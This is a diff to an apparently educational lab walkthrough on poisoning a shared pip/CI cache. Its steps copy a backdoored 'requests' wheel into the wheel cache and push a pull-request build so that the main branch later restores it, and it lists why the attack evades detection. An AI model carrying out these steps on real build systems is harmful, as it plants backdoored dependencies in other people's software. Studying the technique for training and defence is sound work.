@@ -58,57 +58,30 @@ pip wheel . -w /tmp/poison/dist/
 
 ### Step 3: Poison the cache
 
-pip has two cache locations: `~/.cache/pip/wheels/` (user-level, used by local `pip install`) and `/runner/_work/_cache/pip/` (CI runner cache, restored from GitHub Actions cache). We poison both because the attack works on either: local development machines via the user cache, CI runners via the restored cache.
+In this lab, the shared cache is modeled directly in pip's wheel cache, which is the same location the workflow restores.
 
 ```bash
+mkdir -p ~/.cache/pip/wheels
 cp /tmp/poison/dist/requests-2.31.0-*.whl ~/.cache/pip/wheels/
-mkdir -p /runner/_work/_cache/pip
-cp /tmp/poison/dist/requests-2.31.0-*.whl /runner/_work/_cache/pip/
 ```
 
-### Step 4: Trigger the cache to be saved
+### Step 4: Trigger a PR build that reuses the shared cache key
 
 ```bash
-cat > .gitea/workflows/ci.yml << 'EOF'
-name: WeakLink Webapp CI
-
-on:
-  pull_request:
-    branches: [main]
-
-jobs:
-  test:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-
-      - uses: actions/cache@v4
-        with:
-          path: ~/.cache/pip
-          key: pip-${{ runner.os }}-${{ hashFiles('requirements.txt') }}
-          restore-keys: |
-            pip-${{ runner.os }}-
-
-      - name: Install dependencies
-        run: |
-          pip install --no-index --find-links ~/.cache/pip/wheels/ requests
-          pip install -r requirements.txt
-
-      - name: Run tests
-        run: python test_app.py
-EOF
-
-git add -A
-git commit -m "Optimize CI caching"
+printf '\n# cache-poisoning exercise\n' >> app.py
+git add app.py
+git commit -m "Trigger cached PR build"
 git push origin feature/update-deps
 ```
 
-**Checkpoint:** You should now have a backdoored wheel in the pip cache directory, a PR that saves the poisoned cache, and understand how `restore-keys` prefix matching causes the main branch to restore it.
+The important point is that the seeded vulnerable workflow already uses the same shared cache key for every branch. A PR build does not need to change the workflow to poison what `main` restores later.
+
+**Checkpoint:** You should now have a backdoored wheel in the pip cache directory, a PR branch that would reuse the shared cache namespace, and a clear understanding of how `main` can later trust poisoned cached bytes.
 
 ### Step 5: Why this is hard to detect
 
 - **No code changes on main**. the attack is entirely in the cache layer
-- **Build logs look normal**. `pip install` says "using cached wheel"
-- **The lockfile is unchanged**. `requirements.txt` still says `requests==2.31.0`
+- **Build logs look normal**. dependency installation still appears routine
+- **The requirements file is unchanged**
 - **The poisoned package has the correct version**
-- **Cache keys match**. prefix match is a designed feature
+- **Cache keys match**. the vulnerable workflow reuses one shared cache key across branches
